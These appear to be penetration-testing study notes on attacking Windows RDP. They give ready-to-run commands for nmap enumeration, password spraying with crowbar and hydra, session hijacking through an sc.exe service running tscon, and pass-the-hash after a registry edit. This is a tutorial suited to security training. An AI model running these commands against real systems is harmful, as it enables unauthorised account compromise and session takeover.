# 1. What is RDP?

- Remote Desktop Protocol (RDP)
    
- Port: **TCP/3389**
    
- Provides **GUI access** to Windows systems
    
- Used by admins → high-value attack target
    

---

# 2. RDP Attack Surface

RDP can be attacked using:

- Password spraying / brute force
    
- Misconfigurations
    
- Session hijacking
    
- Pass-the-Hash (PtH)
    

---

# 3. Enumeration

Check if RDP is open:

```bash
nmap -p3389 <IP>
```

Result:

- `ms-wbt-server` → RDP is active
    

---

# 4. Password Attacks

## (A) Password Spraying Concept

- One password → many users
    
- Avoid account lockout
    

---

## Tools

### Crowbar

- Used for RDP brute force / spraying
    

```bash
crowbar -b rdp -s <IP> -U users.txt -c 'password123'
```

---

### Hydra

```bash
hydra -L users.txt -p 'password123' <IP> rdp
```

---

## Result:

- Finds valid credentials like:
    

```
administrator : password123
```

---

# 5. RDP Login (Access)

### Linux tool:

```bash
xfreerdp /u:admin /p:password /v:<IP>
```

OR:

```bash
rdesktop -u admin -p password <IP>
```

# 7. RDP Session Hijacking

## Idea:

Steal another user’s active RDP session

---

## Tools:

- `query user` → find sessions
    
- `sc.exe` → create SYSTEM service
    
- `tscon.exe` → switch sessions
    

---

## Step-by-step:

### Step 1: Find sessions

```cmd
query user
```

---

### Step 2: Create service (run tscon as SYSTEM)

```cmd
sc.exe create sessionhijack binpath= "cmd.exe /k tscon <TARGET_ID> /dest:<YOUR_SESSION>"
```

---

### Step 3: Start service

```cmd
net start sessionhijack
```

---

### Result:

- You get victim’s active desktop session
    
- You act as that user
    

---

⚠️ Note:

- Works only on older Windows versions
    
- NOT working on Windows Server 2019+
    

---

# 8. RDP Pass-the-Hash (PtH)

## Idea:

Login using NTLM hash instead of password

---

## Requirement:

- Target must allow **Restricted Admin Mode**
    

---

## Enable PtH:

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

---

## Login using hash:

```bash
xfreerdp /v:<IP> /u:<user> /pth:<NTLM_HASH>
```

---

## Result:

- RDP login without password
    
- Only hash required
